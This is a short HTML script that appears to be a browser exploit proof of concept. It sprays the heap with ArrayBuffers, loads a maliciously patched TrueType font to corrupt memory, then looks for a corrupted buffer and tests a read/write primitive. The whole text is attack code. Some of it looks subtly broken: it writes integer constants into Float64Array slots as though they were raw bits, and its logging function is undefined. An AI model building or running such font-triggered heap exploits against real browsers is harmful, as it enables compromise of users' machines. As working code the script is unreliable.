<script>
const SPRAY_CNT = 30000;
const SPRAY_SIZE = 0x100;
const spray = [];
let corruptedIdx = -1;

function sprayHeap() {
  for (let i = 0; i < SPRAY_CNT; i++) {
    const buf = new ArrayBuffer(SPRAY_SIZE);
    const f64 = new Float64Array(buf);
    for (let j = 0; j < f64.length; j++) f64[j] = 0x4343434343434343;
    spray.push({ f64, buf });
  }
  log("[+] Heap spray complete.");
}

function detectCorruption() {
  for (let i = 0; i < spray.length; i++) {
    const f64 = spray[i].f64;
    if (f64[0] === 0x0108200700000000) {
      log(`[!] Corrupted buffer at index ${i}`);
      corruptedIdx = i;
      return spray[i];
    }
  }
  log("[-] No corruption detected.");
  return null;
}

function tryRWPrimitive(corrupted) {
  log("[*] Trying R/W via corrupted buffer...");

  try {
    corrupted.f64[2] = 0x41414141;
    let result = corrupted.f64[2];
    log("[+] Readback: " + result.toString(16));
  } catch (e) {
    log("[-] R/W failed: " + e);
  }
}

async function loadFont() {
  const font = new FontFace('boom', 'url("mal_patched.ttf")');

  try {
    await font.load();
    document.fonts.add(font);
    document.getElementById("glyph").style.fontFamily = 'boom';
    log("[+] Font loaded and applied.");
  } catch (e) {
    log("[-] Font load failed.");
  }
}

async function startExploit() {
  log("[*] Starting heap spray...");
  sprayHeap();
  await new Promise(r => setTimeout(r, 500));
  await loadFont();
  await new Promise(r => setTimeout(r, 300));

  const corrupted = detectCorruption();
  if (corrupted) tryRWPrimitive(corrupted);
}
</script>
